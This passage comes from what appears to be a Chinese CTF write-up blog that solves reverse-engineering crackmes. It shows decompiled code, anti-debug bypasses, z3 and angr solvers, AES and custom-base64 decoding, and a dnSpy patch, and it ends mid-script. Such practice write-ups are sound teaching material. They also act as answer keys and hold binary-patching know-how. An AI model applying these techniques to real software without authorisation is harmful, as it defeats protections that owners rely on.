&gt;= <span class="number">0x10</span> )</span><br><span class="line">      v9 = *(<span class="keyword">char</span> **)flag;</span><br><span class="line">    v10 = qword_7FF69D5F6048;                 <span class="comment">// i_will_check_is_debug_or_not</span></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)qword_7FF69D5F6060 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      v10 = *(<span class="keyword">char</span> **)qword_7FF69D5F6048;</span><br><span class="line">    v6[v8] = v9[v8] ^ v10[v7 % <span class="number">27</span>];</span><br><span class="line">    ++v7;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 &lt; flag_len );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>转为64位整数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v17 = *v16 + v11;</span><br><span class="line">    ++v15;</span><br><span class="line">    ++v16;</span><br><span class="line">    <span class="keyword">switch</span> ( v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v14 = v17;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        v13 = v17;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">        v12 = v17;</span><br><span class="line">LABEL_23:</span><br><span class="line">        v17 = <span class="number">0</span>i64;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">        sub_7FF69D5F19C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;ERRO,out of range&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v11 = v17 &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v15 &lt; (<span class="keyword">int</span>)flag_len );</span><br></pre></td></tr></table></figure><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>一堆运算后进行校验</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v38 = x[<span class="number">2</span>];</span><br><span class="line">  v19 = x[<span class="number">1</span>];</span><br><span class="line">  v20 = *x;</span><br><span class="line">  v21 = (__int64 *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>ui64);</span><br><span class="line">  <span class="keyword">if</span> ( IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF69D5F19C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;Hi , DO not debug me !&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = v19 &amp; v20;</span><br><span class="line">  *v21 = v19 &amp; v20;</span><br><span class="line">  v23 = v38 &amp; ~v20;</span><br><span class="line">  v21[<span class="number">1</span>] = v23;</span><br><span class="line">  v24 = ~v19;</span><br><span class="line">  v25 = v38 &amp; v24;</span><br><span class="line">  v21[<span class="number">2</span>] = v38 &amp; v24;</span><br><span class="line">  v26 = v20 &amp; v24;</span><br><span class="line">  v21[<span class="number">3</span>] = v26;</span><br><span class="line">  <span class="keyword">if</span> ( v23 != <span class="number">0x11204161012</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    v21[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v23 = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v27 = v23 | v22 | v25 | v26;</span><br><span class="line">  v28 = x[<span class="number">1</span>];</span><br><span class="line">  v29 = x[<span class="number">2</span>];</span><br><span class="line">  v30 = v25 &amp; *x | v29 &amp; (v22 | v28 &amp; ~*x | ~(v28 | *x));</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v30 == <span class="number">0x8020717153E3013</span>i64 )</span><br><span class="line">    v31 = v27 == <span class="number">0x3E3A4717373E7F1F</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (v27 ^ x[<span class="number">3</span>]) == <span class="number">0x3E3A4717050F791F</span>i64 )</span><br><span class="line">    v3 = v31;</span><br><span class="line">  <span class="keyword">if</span> ( (v23 | v22 | v28 &amp; v29) == (~*x &amp; v29 | <span class="number">0xC00020130082C0C</span>i64) &amp;&amp; v3 )</span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>用z3直接暴力解，发现多解，搜wp发现比赛当时主办方给了提示，差不多是<code>flag[8:16] == &#39;e!P0or_a&#39;</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>*<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">v38 = x[<span class="number">2</span>]</span><br><span class="line">v19 = x[<span class="number">1</span>]</span><br><span class="line">v20 = x[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">v21 = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">v22 = v19 &amp; v20</span><br><span class="line">v21[<span class="number">0</span>] = v19 &amp; v20</span><br><span class="line">v23 = v38 &amp; ~v20</span><br><span class="line">v21[<span class="number">1</span>] = v23</span><br><span class="line">v24 = ~v19</span><br><span class="line">v25 = v38 &amp; v24</span><br><span class="line">v21[<span class="number">2</span>] = v38 &amp; v24</span><br><span class="line">v26 = v20 &amp; v24</span><br><span class="line">v21[<span class="number">3</span>] = v26</span><br><span class="line"></span><br><span class="line">s.add(v23 == <span class="number">0x11204161012</span>)</span><br><span class="line"></span><br><span class="line">v27 = v23 | v22 | v25 | v26</span><br><span class="line">v28 = x[<span class="number">1</span>]</span><br><span class="line">v29 = x[<span class="number">2</span>]</span><br><span class="line">v30 = v25 &amp; x[<span class="number">0</span>] | v29 &amp; (v22 | v28 &amp; ~x[<span class="number">0</span>] | ~(v28 | x[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">s.add(v30 == <span class="number">0x8020717153E3013</span>)</span><br><span class="line">s.add(v27 == <span class="number">0x3E3A4717373E7F1F</span>)</span><br><span class="line">s.add(v27 ^ x[<span class="number">3</span>] == <span class="number">0x3E3A4717050F791F</span>)</span><br><span class="line"></span><br><span class="line">s.add((v23 | v22 | v28 &amp; v29) == ((~x[<span class="number">0</span>] &amp; v29 | <span class="number">0xC00020130082C0C</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line"></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        _data = []</span><br><span class="line">        tmp = m[x[i]].as_long()</span><br><span class="line">        <span class="comment"># print(hex(tmp))</span></span><br><span class="line">        <span class="keyword">while</span> tmp:</span><br><span class="line">            _data.append(tmp &amp; <span class="number">0xff</span>)</span><br><span class="line">            tmp &gt;&gt;= <span class="number">8</span></span><br><span class="line">        data += _data[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print(list(map(hex, data)))</span></span><br><span class="line"></span><br><span class="line">    xor_data = <span class="string">b&quot;i_will_check_is_debug_or_not&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        data[i] ^= xor_data[i]</span><br><span class="line">    </span><br><span class="line">    data = data[:<span class="number">27</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">    flag += <span class="built_in">bytes</span>(data[:<span class="number">8</span>])</span><br><span class="line">    flag += <span class="string">b&#x27;e!P0or_a&#x27;</span></span><br><span class="line">    flag += <span class="built_in">bytes</span>(data[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="findKey"><a href="#findKey" class="headerlink" title="findKey"></a>findKey</h3><p>通过字符串找到核心代码（偏移0x1640），花指令nop即可</p><p>从后往前，先异或得到最后对比的值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">b&quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    s1 += <span class="built_in">bytes</span>([i ^ <span class="built_in">ord</span>(<span class="string">&quot;S&quot;</span>)])</span><br><span class="line"><span class="built_in">print</span>(s1) <span class="comment"># c8837b23ff8aaa8a2dde915473ce0991</span></span><br></pre></td></tr></table></figure><p>根据所查，该函数为求得md5值</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002203439352.png" alt="image-20211002203439352"></p><p>则通过<a target="_blank" rel="noopener" href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a>得到<code>123321</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002203532357.png" alt="image-20211002203532357"></p><p>查交叉引用，可知String1在sub_401B20函数赋值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">sub_401B20</span><span class="params">(HWND hDlg, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x110</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x111</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)a3 != <span class="number">1</span> &amp;&amp; (<span class="keyword">unsigned</span> __int16)a3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      EndDialog(hDlg, (<span class="keyword">unsigned</span> __int16)a3);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x202</span>:</span><br><span class="line">LABEL_6:</span><br><span class="line">      String1[dword_428C50++] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x205</span>:</span><br><span class="line">      String1[dword_428C50++] = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x208</span>:</span><br><span class="line">      <span class="keyword">if</span> ( dword_428D58 &lt; <span class="number">3</span> )</span><br><span class="line">        ++dword_428D5C;</span><br><span class="line">      String1[dword_428C50++] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>0x110 0x111 等数字</code>丢进谷歌所搜，找到<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhanglei1371/p/6664829.html">AHK的OnMessage - zhanglei1371 - 博客园 (cnblogs.com)</a>，则有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WM_LBUTTONUP  0x202</span><br><span class="line">WM_RBUTTONUP  0x205</span><br><span class="line">WM_MBUTTONUP  0x208</span><br></pre></td></tr></table></figure><p>根据<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/WM_LBUTTONDOWN/1513446">WM_LBUTTONDOWN_百度百科 (baidu.com)</a>知道WM_LBUTTONDOWN是一个Windows消息，该消息当用户在window客户区域点击鼠标左键的时候发送。则我们根据已知可知我们需要在特定区域点击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">左 中 右 右 中  左</span><br></pre></td></tr></table></figure><p>根据题目猜测是在<code>Help =&gt; About</code>弹出的区域进行点击，后得到flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002211707288.png" alt="image-20211002211707288"></p><h3 id="GWCTF-2019-re3"><a href="#GWCTF-2019-re3" class="headerlink" title="[GWCTF 2019]re3"></a>[GWCTF 2019]re3</h3><p>代码自修改， 密钥生成直接动调过，原AES加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">data = [<span class="number">0xBC</span>, <span class="number">0x0A</span>, <span class="number">0xAD</span>, <span class="number">0xC0</span>, <span class="number">0x14</span>, <span class="number">0x7C</span>, <span class="number">0x5E</span>, <span class="number">0xCC</span>, <span class="number">0xE0</span>, <span class="number">0xB1</span>, <span class="number">0x40</span>, <span class="number">0xBC</span>, <span class="number">0x9C</span>, <span class="number">0x51</span>, <span class="number">0xD5</span>, <span class="number">0x2B</span>, <span class="number">0x46</span>, <span class="number">0xB2</span>, <span class="number">0xB9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0xE5</span>, <span class="number">0x32</span>, <span class="number">0x4B</span>, <span class="number">0xAD</span>, <span class="number">0x7F</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0x9C</span>, <span class="number">0xDB</span>, <span class="number">0x4B</span>, <span class="number">0x5B</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>([<span class="number">0xCB</span>, <span class="number">0x8D</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0x21</span>, <span class="number">0xB4</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0xC1</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x92</span>, <span class="number">0x66</span>, <span class="number">0xCE</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>(data)</span><br><span class="line">obj = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plain = obj.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><h3 id="特殊的-BASE64"><a href="#特殊的-BASE64" class="headerlink" title="特殊的 BASE64"></a>特殊的 BASE64</h3><p>c++, 没有去符号表</p><p>base64换表加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">b&#x27;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==&#x27;</span></span><br><span class="line"></span><br><span class="line">new_table = <span class="string">b&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+&quot;</span></span><br><span class="line"></span><br><span class="line">old_table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = s.translate(<span class="built_in">bytes</span>.maketrans(new_table, old_table))</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(s))</span><br></pre></td></tr></table></figure><h3 id="FlareOn5-Minesweeper-Championship-Registration"><a href="#FlareOn5-Minesweeper-Championship-Registration" class="headerlink" title="[FlareOn5]Minesweeper Championship Registration"></a>[FlareOn5]Minesweeper Championship Registration</h3><p>jadx打开看到flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002213012376.png" alt="image-20211002213012376"></p><h3 id="网鼎杯-2020-青龙组-jocker"><a href="#网鼎杯-2020-青龙组-jocker" class="headerlink" title="[网鼎杯 2020 青龙组]jocker"></a>[网鼎杯 2020 青龙组]jocker</h3><p><a href="https://lantern.cool/wp-games-2020wd/">2020 网鼎杯 | Lantern’s 小站</a></p><h3 id="ACTF新生赛2020-SoulLike"><a href="#ACTF新生赛2020-SoulLike" class="headerlink" title="[ACTF新生赛2020]SoulLike"></a>[ACTF新生赛2020]SoulLike</h3><p>直接angr</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./SoulLike&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x400000</span>+ <span class="number">0x00000000001117D</span>, avoid=[<span class="number">0x400000</span>+<span class="number">0x0000000000111A1</span>, <span class="number">0x400000</span> + <span class="number">0x00000000001102D</span>])</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><h3 id="2019红帽杯-xx"><a href="#2019红帽杯-xx" class="headerlink" title="[2019红帽杯]xx"></a>[2019红帽杯]xx</h3><p><a href="https://lantern.cool/wp-games-2019redhat/">2019 红帽杯 | Lantern’s 小站</a></p><h3 id="FlareOn5-Ultimate-Minesweeper"><a href="#FlareOn5-Ultimate-Minesweeper" class="headerlink" title="[FlareOn5]Ultimate Minesweeper"></a>[FlareOn5]Ultimate Minesweeper</h3><p>.Net 用 dnspy, 主要flag生成函数在下图中的SucessPopup中</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002215543589.png" alt="image-20211002215543589"></p><p>其中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void SquareRevealedCallback(uint column, uint row)</span><br><span class="line">	&#123;</span><br><span class="line">		if (this.MineField.BombRevealed) // 判断是否为雷区</span><br><span class="line">		&#123;</span><br><span class="line">			this.stopwatch.Stop();</span><br><span class="line">			Application.DoEvents();</span><br><span class="line">			Thread.Sleep(1000);</span><br><span class="line">			new FailurePopup().ShowDialog();</span><br><span class="line">			Application.Exit();</span><br><span class="line">		&#125;</span><br><span class="line">		this.RevealedCells.Add(row * MainForm.VALLOC_NODE_LIMIT + column);</span><br><span class="line">		if (this.MineField.TotalUnrevealedEmptySquares == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			this.stopwatch.Stop();</span><br><span class="line">			Application.DoEvents();</span><br><span class="line">			Thread.Sleep(1000);</span><br><span class="line">			new SuccessPopup(this.GetKey(this.RevealedCells)).ShowDialog();</span><br><span class="line">			Application.Exit();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure><p>而 BombRevealed 实现如下, 通过变量名知道通过MinesVisible来判断是否显示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public bool BombRevealed</span><br><span class="line">		&#123;</span><br><span class="line">			get</span><br><span class="line">			&#123;</span><br><span class="line">				int num = 0;</span><br><span class="line">				while ((long)num &lt; (long)((ulong)this.Size))</span><br><span class="line">				&#123;</span><br><span class="line">					int num2 = 0;</span><br><span class="line">					while ((long)num2 &lt; (long)((ulong)this.Size))</span><br><span class="line">					&#123;</span><br><span class="line">						if (this.MinesPresent[num2, num] &amp;&amp; this.MinesVisible[num2, num])</span><br><span class="line">						&#123;</span><br><span class="line">							return true;</span><br><span class="line">						&#125;</span><br><span class="line">						num2++;</span><br><span class="line">					&#125;</span><br><span class="line">					num++;</span><br><span class="line">				&#125;</span><br><span class="line">				return false;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure><p>找到打印函数，将显示直接修改为true, 保存</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002221942727.png" alt="image-20211002221942727"></p><p>将所有全部打印出来，点下那三个8得到flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002222025703.png" alt="image-20211002222025703"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002222044310.png" alt="image-20211002222044310"></p><h3 id="FlareOn1-Bob-Doge"><a href="#FlareOn1-Bob-Doge" class="headerlink" title="[FlareOn1]Bob Doge"></a>[FlareOn1]Bob Doge</h3><p>加压得到一个C1.exe程序，双击解压出一个Challenge1.exe</p><p>动调直接拿到flag</p><p>p.s. 题目描述的密码用来干什么的？</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002223333528.png" alt="image-20211002223333528"></p><h3 id="MRCTF2020-PixelShooter"><a href="#MRCTF2020-PixelShooter" class="headerlink" title="[MRCTF2020]PixelShooter"></a>[MRCTF2020]PixelShooter</h3><p>Unity游戏，解压找Assembly-CSharp.dl， dnspy打开，在UIContoller找到flag</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002224419962.png" alt="image-20211002224419962"></p><h3 id="equation"><a href="#equation" class="headerlink" title="equation"></a>equation</h3><p>jsf**k编码</p><p>拿正则表达式解码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deEquation(str) &#123;</span><br><span class="line">  for (let i = 0; i &lt;= 1; i++) &#123;</span><br><span class="line">  str = str.replace(/l\[(\D*?)](\+l|-l|==)/g, (m, a, b) =&gt; &#x27;l[&#x27; + eval(a) + &#x27;]&#x27; + b);</span><br><span class="line">  &#125;</span><br><span class="line">  str = str.replace(/==(\D*?)&amp;&amp;/g, (m, a) =&gt; &#x27;==&#x27; + eval(a) + &#x27;&amp;&amp;&#x27;);</span><br><span class="line">  return str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再z3解密即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">l = [Int(<span class="string">&quot;l%d&quot;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2a</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    s.add(i&gt;<span class="number">0</span>)</span><br><span class="line">    s.add(i&lt;<span class="number">255</span>)</span><br><span class="line">s.add(l[<span class="number">40</span>]+l[<span class="number">35</span>]+l[<span class="number">34</span>]-l[<span class="number">0</span>]-l[<span class="number">15</span>]-l[<span class="number">37</span>]+l[<span class="number">7</span>]+l[<span class="number">6</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">19</span>]+l[<span class="number">8</span>]-l[<span class="number">17</span>]-l[<span class="number">14</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">9</span>]+l[<span class="number">22</span>]+l[<span class="number">41</span>]+l[<span class="number">3</span>]-l[<span class="number">29</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]+l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">30</span>]+l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">2</span>]+l[<span class="number">27</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">33</span>]-l[<span class="number">18</span>]+l[<span class="number">4</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">31</span>]+l[<span class="number">26</span>]+l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">27</span>]-l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">30</span>]+l[<span class="number">1</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]-l[<span class="number">41</span>]-l[<span class="number">14</span>]-l[<span class="number">19</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]-l[<span class="number">6</span>]-l[<span class="number">0</span>]-l[<span class="number">22</span>]-l[<span class="number">18</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]+l[<span class="number">34</span>]-l[<span class="number">21</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">8</span>]-l[<span class="number">40</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]==-<span class="number">448</span>)</span><br><span class="line">s.add(l[<span class="number">26</span>]+l[<span class="number">14</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]+l[<span class="number">13</span>]+l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">7</span>]+l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">25</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">35</span>]-l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">8</span>]+l[<span class="number">10</span>]-l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]+l[<span class="number">17</span>]+l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]+l[<span class="number">38</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]==<span class="number">1244</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">22</span>]+l[<span class="number">15</span>]+l[<span class="number">2</span>]-l[<span class="number">28</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]-l[<span class="number">18</span>]+l[<span class="number">30</span>]-l[<span class="number">9</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">34</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]+l[<span class="number">16</span>]-l[<span class="number">7</span>]+l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]-l[<span class="number">12</span>]-l[<span class="number">40</span>]-l[<span class="number">25</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">20</span>]-l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">33</span>]-l[<span class="number">21</span>]+l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]==-<span class="number">39</span>)</span><br><span class="line">s.add(l[<span class="number">41</span>]-l[<span class="number">29</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">20</span>]-l[<span class="number">33</span>]+l[<span class="number">35</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">26</span>]-l[<span class="number">24</span>]-l[<span class="number">17</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]-l[<span class="number">0</span>]-l[<span class="number">13</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]+l[<span class="number">14</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">40</span>]+l[<span class="number">34</span>]-l[<span 